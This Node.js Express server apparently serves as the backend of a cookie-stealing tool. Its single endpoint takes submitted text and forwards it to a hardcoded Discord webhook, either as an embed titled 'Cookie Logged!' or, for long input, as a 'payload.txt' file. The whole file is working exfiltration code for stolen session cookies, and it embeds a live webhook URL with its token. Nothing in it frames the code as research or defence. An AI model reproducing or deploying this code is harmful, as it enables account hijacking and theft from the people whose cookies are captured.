const express = require('express');
const fetch = require('node-fetch');
const app = express();
const fs = require('fs');
const path = require('path');

app.use(express.json());
app.use(express.static(__dirname));

app.post('/api/send-to-discord', async (req, res) => {
  try {
    const { inputText, isLong } = req.body;

    if (isLong) {
      const filePath = path.join(__dirname, 'payload.txt');
      fs.writeFileSync(filePath, inputText);

      const formData = new FormData();
      formData.append('file', fs.createReadStream(filePath), 'payload.txt');

      const response = await fetch(
        'https://discord.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L',
        {
          method: 'POST',
          body: formData,
          headers: {
            'Content-Type': 'multipart/form-data',
          },
        }
      );
      fs.unlinkSync(filePath); 
      res.sendStatus(response.ok ? 200 : 500);
    } else {
      const response = await fetch(
        'https://discord.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '🍪 Cookie Logged!',
              color: 0x6a00ff,
              description: `**Payload:**\n\`\`\`${inputText}\`\`\``,
            }],
          }),
        }
      );
      res.sendStatus(response.ok ? 200 : 500);
    }
  } catch (err) {
    res.status(500).json({ error: 'Failed to send to Discord' });
  }
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
